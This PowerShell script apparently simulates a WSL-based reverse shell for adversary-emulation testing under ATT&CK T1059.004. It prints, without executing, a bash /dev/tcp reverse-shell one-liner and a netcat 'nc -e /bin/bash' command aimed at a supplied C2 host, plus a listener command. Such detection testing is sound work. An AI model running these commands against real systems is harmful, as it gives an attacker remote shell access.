param(
    [Parameter(Mandatory=$true)]
    [string]$C2Host,
    
    [Parameter(Mandatory=$false)]
    [int]$C2Port = 4444
)

$ErrorActionPreference = "SilentlyContinue"
Write-Host "[*] Starting WSL Reverse Shell Setup..." -ForegroundColor Cyan

# T1059.004 - Unix Shell
# Adversaries can use bash within WSL to establish reverse shells

Write-Host "[*] [T1059.004] Preparing bash reverse shell via WSL..."
Write-Host "[!] Target C2: $C2Host`:$C2Port" -ForegroundColor Yellow

# Check if netcat is available in WSL
Write-Host "`n[*] Checking for netcat availability in WSL..."
$ncCheck = wsl.exe which nc 2>&1
if ($ncCheck -match "/nc") {
    Write-Host "[+] Netcat found: $ncCheck" -ForegroundColor Green
} else {
    Write-Host "[!] Netcat not found, checking for alternatives..." -ForegroundColor Yellow
    wsl.exe which bash
}

# Display the reverse shell command (simulation - does not actually connect)
Write-Host "`n[*] Reverse shell command that would be executed:" -ForegroundColor Cyan
$shellCmd = "bash -i >& /dev/tcp/$C2Host/$C2Port 0>&1"
Write-Host "    $shellCmd" -ForegroundColor Magenta

# Alternative using netcat
$ncCmd = "nc -e /bin/bash $C2Host $C2Port"
Write-Host "`n[*] Alternative netcat command:" -ForegroundColor Cyan
Write-Host "    $ncCmd" -ForegroundColor Magenta

# Simulation - create a marker file to show execution
Write-Host "`n[*] [SIMULATION] Creating marker file to demonstrate execution..."
$timestamp = Get-Date -Format "yyyy-MM-dd_HH-mm-ss"
wsl.exe bash -c "echo 'WSL Reverse Shell Simulation - $timestamp - Target: $C2Host`:$C2Port' > /tmp/wsl_shell_marker.txt"
wsl.exe cat /tmp/wsl_shell_marker.txt

Write-Host "`n[*] In a real scenario, the attacker would:" -ForegroundColor Yellow
Write-Host "    1. Set up a listener: nc -lvnp $C2Port"
Write-Host "    2. Execute reverse shell from WSL"
Write-Host "    3. Receive interactive bash session"

Write-Host "`n[+] WSL Reverse Shell Setup Complete (Simulation Mode)." -ForegroundColor Green
